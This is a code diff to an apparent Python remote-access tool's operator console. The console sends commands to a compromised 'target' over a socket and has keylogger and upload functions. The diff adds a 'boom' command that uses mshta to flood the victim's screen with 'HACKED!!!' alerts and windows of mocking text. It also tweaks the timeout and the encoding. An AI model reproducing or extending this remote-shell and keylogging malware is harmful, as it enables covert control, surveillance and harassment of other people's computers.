@@ -8,7 +8,7 @@ import numpy as np
 from termcolor import colored
 
 
-def data_recv(target, timeout=60):
+def data_recv(target, timeout=120):
     data = ''
     target.settimeout(timeout)
     while True:
@@ -31,7 +31,7 @@ def data_recv(target, timeout=60):
 def data_send(data, target):
     try:
         jsondata = json.dumps(data)
-        target.sendall(jsondata.encode())
+        target.sendall(jsondata.encode('latin-1'))
     except Exception as e:
         print(f"Error sending data: {e}")
 
@@ -87,17 +87,32 @@ def keylogger_start(target):
     listener_thread.start()
 
 
+def boom():
+    commands = [
+        'mshta "javascript:for (var i = 0; i < 10; i++) { alert(\'HACKED!!! HACKED!!! HACKED!!! HACKED!!!\'); } window.close();"',
+        'mshta "javascript:for (var i = 0; i < 10; i++) { window.open(\'\',\'Window\' + i,\'width=1280,height=720\').document.write(\'<h1>HAHAHAHAHAHAHAHAH!HAHAHAHAHAHAHAHAH!HAHAHAHAHAHAHAHAH!HAHAHAHAHAHAHAHAH!HAHAHAHAHAHAHAHAH!HAHAHAHAHAHAHAHAH!HAHAHAHAHAHAHAHHA!</h1>\'); }"'
+    ]
+
+    for command in commands:
+        try:
+            subprocess.run(command, shell=True, check=True)
+        except subprocess.CalledProcessError as e:
+            print(f"Error: {e}")
+
+
 def t_commun(target, ip):
     count = 0
     keylogger_thread = None
     while True:
         try:
-            comm = input(colored('* Shell#%s: ' % str(ip), 'green'))
+            comm = input(colored('~(SHELL)# %s: ' % str(ip), 'green'))
             data_send(comm, target)
             if comm == 'exit':
                 break
             elif comm == 'clear':
                 os.system('clear')
+            elif comm[:4] == 'boom':
+                boom()
             elif comm[:3] == 'cd ':
                 pass
             elif comm[:6] == 'upload':
